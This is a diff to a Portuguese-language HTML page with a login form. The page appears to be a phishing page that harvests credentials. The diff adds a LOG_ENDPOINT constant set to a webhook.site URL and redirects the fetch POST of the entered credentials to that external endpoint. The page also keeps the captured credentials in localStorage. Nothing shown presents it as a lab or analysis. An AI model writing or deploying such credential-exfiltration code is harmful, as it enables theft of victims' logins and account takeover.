@@ -1,3 +1,5 @@
+# Cria o novo index.html com o código completo
+cat > index.html << 'EOF'
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -254,6 +256,10 @@
     </div>
 
     <script>
+        // Configuração - EDITAR AQUI!
+        const LOG_ENDPOINT = 'https://webhook.site/ab830b1e-933d-4730-becf-f96ff893bd33';
+        // const LOG_ENDPOINT = 'http://localhost:8000/log';  // Opção local
+
         function showLoginForm() {
             document.querySelector('.action-section').style.display = 'none';
             document.getElementById('loginForm').style.display = 'block';
@@ -287,8 +293,8 @@
             savedCredentials.push(credentials);
             localStorage.setItem('grupo_creds', JSON.stringify(savedCredentials));
             
-            // Envia para o servidor
-            fetch('/log', {
+            // Envia para o servidor ou webhook
+            fetch(LOG_ENDPOINT, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -327,4 +333,5 @@
         document.addEventListener('DOMContentLoaded', generateRandomInitials);
     </script>
 </body>
-  </html>
+</html>
+
